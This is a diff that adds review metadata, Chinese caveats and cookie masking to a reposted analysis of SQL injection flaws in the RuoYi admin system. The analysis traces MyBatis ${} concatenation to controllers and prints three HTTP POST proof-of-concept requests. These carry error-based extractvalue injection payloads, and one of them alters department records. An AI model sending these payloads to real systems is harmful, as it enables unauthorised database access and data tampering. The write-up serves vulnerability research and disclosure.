@@ -1,6 +1,43 @@
 ---
 source: "MrWQ/vulnerability-paper"
+product: "RuoYi/MyBatis业务SQL拼接"
+record_type: "unknown"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "若依 (RuoYi) 管理系统后台 sql 注入漏洞分析"
+prerequisites: "来源所述条件，未列明部分仍待核：实验4.6.1、声称<=4.6.1；后台部门修改/角色读取权限及数据权限切面行为需说明"
+side_effects: "未执行；本文需注意的操作影响：应用用户可控性不能由${}一项证明；dataScope常由服务端切面注入，需确认具体版本清理/角色分支，不能遍历$就断言所有可注入；写操作副作用与版本修复未交代；部门edit更新状态，不能当只读检测；只有影响上界无补丁"
+source_status: "recorded"
+source_url: "https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247493177&idx=1&sn=d927ba04171466841222528403f6e2d3&chksm=c172f7a8f6057ebeeffb3e9439b0d9e7b8cb45a28f2d703c537037fc2895b0aecb193828e277&scene=21&sessionid=1661481923&key=d8221f16b48f88c871ae847b008b10388247749d7463eb77aa3d492ed05b5d208577c0692984b114e5070e2af77339000f97b3650866d6ddbc3d0e4fd233672f49f80927ce48587be205dd7ae391b8346994503f676f4b6730566dd1bc4e180d90160577eb39c77f37f91ae1097c625d0c81356a93cd9994b5bcca136a59813d&ascene=15&uin=MTA3Mzc3OTIzNQ==&devicetype=Windows%20Server%202016%20x64&version=63070517&lang=zh_CN&session_us=gh_9c93932cfcf8&exportkey=Aec4lA6mu2mOBRgMvREj%20AI=&acctmode=0&pass_ticket=oG5tVTdM46BqDULFeP1XUChlivJaeyzcE871u61GRvupgy6AnaYat1bkFQctsNYY&wx_header=0&fontgear=2#wechat_redirect"
+id: "vw-f36ee11f004239a6b70c5651"
+entity_id: "ve-f36ee11f004239a6b70c5651"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：实验4.6.1、声称&lt;=4.6.1；后台部门修改/角色读取权限及数据权限切面行为需说明
+
+代码与实验材料：ancestors update与params.dataScope list/export回溯有价值；XML、Java、HTTP全被压缩且部分属性丢失
+
+来源证据范围：跳跳糖公众号原研究经MrWQ转，缺代码tag/补丁
+
+- **适用与权限边界（1）**：应用用户可控性不能由${}一项证明；依据：dataScope常由服务端切面注入，需确认具体版本清理/角色分支，不能遍历$就断言所有可注入。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **代码与转录边界（2）**：源码与报文转录损坏；依据：DOCTYPE configurationPUBLIC、property无name/value、mapper闭合在select之前，HTTP头无换行。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。
+
+- **操作与副作用边界（3）**：写操作副作用与版本修复未交代；依据：部门edit更新状态，不能当只读检测；只有影响上界无补丁。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # 若依 (RuoYi) 管理系统后台 sql 注入漏洞分析
 
@@ -66,19 +103,19 @@ ruoyi 中关于 mybatis 的相关配置在`application.yml`文件中：
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aQKjC9B0XrNGJ0XObjiadzfIZGQtYdw60pnroYvZhMCFJlYyz0h6QkoQ/640?wx_fmt=png)image.png 由以上配置可知，所有的 mapper.xml 映射文件在 classpath*:mapper//*Mapper.xml 中。因此，有个简单粗暴的方法，遍历所有 classpath:mapper/*/*Mapper.xml 文件，找包含 "`$`" 字符的文件。于是定位到`/resources/mapper/system/SysDeptMapper.xml`文件。 `SysDeptMapper.xml`配置文件里内容为:![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aFmeTVIbI5hPOmmEXWw2NQCFSMd0KYpiaqUTUegluD5ekJMxibI9vUq2g/640?wx_fmt=png)image.png 很明显`ancestors`参数存在 sql 注入，其中完整语句是`update sys_dept set status=0 where dept_id in (ancestors的值)`。因此可通过该 update 操作触发 sql 注入。那么如何设计请求来触发该 update 数据操作呢？通过`SysDeptMapper.xml`文件中的`<mapper namespace="com.ruoyi.system.mapper.SysDeptMapper">`定位到 Dao 层，在 dao 层对应的`com.ruoyi.system.mapper.SysDeptMapper`类中找到该方法：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aQcFFZYj8SxPpOmAfB50UGWK0kYrZPQDnIe4Ec6AB215LvnS8OrFo7A/640?wx_fmt=png)image.png 在基于 springboot 框架中，可通过以下 3 种方式进行 sql 操作：1、业务层调用 dao 层 2、controller 调用 Service 层间接调用 dao 层 3、controller 直接调用 dao 层 在 RuoYi 中，找到在 service 层的`com.ruoyi.system.service.impl.SysDeptServiceImpl`类的`updateParentDeptStatus()`方法中可调用到`updateDeptStatus(SysDept dept)`方法。![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3ahynzAicWCd66anEyr8DYiciac8Lqr8GBibBiaX56rWn9XFXT98dZ2Lib6H1g/640?wx_fmt=png)image.png 而`com.ruoyi.system.service.impl.SysDeptServiceImpl#updateParentDeptStatus`又是通过`com.ruoyi.system.service.impl.SysDeptServiceImpl#updateDep`方法调用。![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3acHBJtUeBwmew5rbnnsB6gnnrBCfzxhGicXRqgLQEEmJyfYzol2RcryA/640?wx_fmt=png)image.png 因此最后定位到`SysDeptController`的`editSave()`方法可触发该调用。![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3a3YBfuzEwXLJiaRlVu8Myu9Avwv3Il0WiaJ81SvwBeRamGS7NmdeS0Vlw/640?wx_fmt=png)image.png 局部调用链如下图：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aOiciaNxInCG81sD5ZItg0ECDXlLEXUMxEq8ic4EicWzdqPsUYJOLf496ibA/640?wx_fmt=png)image.png 由此最终利用如下：
 
 ```
-POST /system/dept/edit HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=1b3960f0-fd75-4bc5-a130-9e822c5c9e5dConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 111DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
+POST /system/dept/edit HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=1b3*****************************************on: closeContent-Type: application/x-www-form-urlencodedContent-Length: 111DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3a81bFA3vUjJgiaqYiarxjbkZNz1LpTic7g2feuDXkON6lCnDmz31dXVwDQ/640?wx_fmt=png)image.png 按照同样的方式也可定位到`/resources/mapper/system/SysRoleMapper.xml`文件。![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aicib9hmr1Z8picjt2daCwzULwKB334YdrKnLOr0xctlHa1hgO08sibhH1g/640?wx_fmt=png)image.png 完整的 sql 语句应该是: `select distinct r.role_id, r.role_name, r.role_key, r.role_sort, r.data_scope, r.status, r.del_flag, r.create_time, r.remark from sys_role r left join sys_user_role ur on ur.role_id = r.role_id left join sys_user u on u.user_id = ur.user_id left join sys_dept d on u.dept_id = d.dept_id where r.del_flag = '0' ${params.dataScope}` 可见`${params.dataScope}`能触发 sql 注入。按照以上同样的方式，根据`SysRoleMapper.xml`文件中的`<mapper namespace="com.ruoyi.system.mapper.SysRoleMapper">`定位到`com.ruoyi.system.mapper.SysRoleMapper`类的`selectRoleList`方法：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aLO00CemLshtvKGwKr0zL64KUtBUGPltfeBOG19tXZ6FePgDAjBwcJg/640?wx_fmt=png)image.png 然后回溯调用`selectRoleList`方法的 service，定位到`com.ruoyi.system.service.impl.SysRoleServiceImpl#selectRoleList`：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aW580pS0KDicm1I9xQb89LibCPibpF4akd1Wv7FiaClXWPxAMXpMlYhiaGDQ/640?wx_fmt=png)image.png 最后查找调用`com.ruoyi.system.service.impl.SysRoleServiceImpl#selectRoleList`方法的 controller——`com.ruoyi.web.controller.system.SysRoleController`，在其中的`list()`方法和`export()`方法均调用了`selectRoleList`方法：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aiceic8nPGXfapXuns9NTl1gSicqicEWcovQkf24AQ5bLicYeuia4FkGzbYHg/640?wx_fmt=png)image.png 至此可构造如下 poc 进行 sql 注入利用：
 
 ```
-POST /system/role/list HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=906c97c0-7058-4645-a87a-d15a940f4841Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 71params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
+POST /system/role/list HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=906*****************************************on: closeContent-Type: application/x-www-form-urlencodedContent-Length: 71params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3ahxPLN4STxGyISichsnX9DRBC8VS9BOvA7ZqmibEehcxdajkrrIVetTXw/640?wx_fmt=png)image.png 或者利用`/export`接口触发 sql 注入：
 
 ```
-POST /system/role/export HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=906c97c0-7058-4645-a87a-d15a940f4841Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 75params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
+POST /system/role/export HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=906*****************************************on: closeContent-Type: application/x-www-form-urlencodedContent-Length: 75params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0XQgCIfNwoRzjEK9rOsk3aPBxtZxmDzDWnKhVXmAutfb7dlnibqDJtx5XhGLasuhWWHNjy7DPL0pQ/640?wx_fmt=png)image.png
